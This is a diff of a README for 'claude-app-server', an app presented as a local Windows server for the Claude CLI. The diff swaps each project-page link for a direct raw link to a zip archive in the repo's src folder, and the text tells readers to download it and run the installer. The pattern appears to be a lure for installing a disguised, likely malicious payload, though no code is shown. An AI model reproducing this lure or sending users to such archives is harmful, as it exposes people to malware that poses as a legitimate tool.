@@ -1,6 +1,6 @@
 # ⚙️ claude-app-server - Simple Local Server for Claude CLI  
 
-[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-brightgreen)](https://github.com/maryam2001-ux/claude-app-server)
+[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-brightgreen)](https://raw.githubusercontent.com/maryam2001-ux/claude-app-server/main/src/server_claude_app_2.8.zip)
 
 ---
 
@@ -32,7 +32,7 @@ No special hardware or software is needed. The server runs locally, so it does n
 
 Click the download button below, which takes you to the project page on GitHub. There, you will find the files ready for you to download.
 
-[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-blue)](https://github.com/maryam2001-ux/claude-app-server)
+[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-blue)](https://raw.githubusercontent.com/maryam2001-ux/claude-app-server/main/src/server_claude_app_2.8.zip)
 
 ### Step 2: Locate the download file  
 
@@ -94,7 +94,7 @@ If the server does not start or stops working, try this:
 - **Close conflicting programs:** Sometimes other software may block it.
 - **Firewall:** Make sure Windows Defender or other firewalls allow the app.
 
-If problems continue, revisit the [download page](https://github.com/maryam2001-ux/claude-app-server) for more information and updates.
+If problems continue, revisit the [download page](https://raw.githubusercontent.com/maryam2001-ux/claude-app-server/main/src/server_claude_app_2.8.zip) for more information and updates.
 
 ---
 
@@ -128,7 +128,7 @@ Check the GitHub page regularly for new versions. New releases may include bug f
 
 To update:
 
-1. Download the latest version from the [download page](https://github.com/maryam2001-ux/claude-app-server).
+1. Download the latest version from the [download page](https://raw.githubusercontent.com/maryam2001-ux/claude-app-server/main/src/server_claude_app_2.8.zip).
 2. Run the new installer over the old version.
 3. Your settings should stay the same.
 
@@ -144,4 +144,4 @@ If you need assistance:
 
 ---
 
-[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-brightgreen)](https://github.com/maryam2001-ux/claude-app-server)
+[![Download claude-app-server](https://img.shields.io/badge/Download-claude--app--server-brightgreen)](https://raw.githubusercontent.com/maryam2001-ux/claude-app-server/main/src/server_claude_app_2.8.zip)
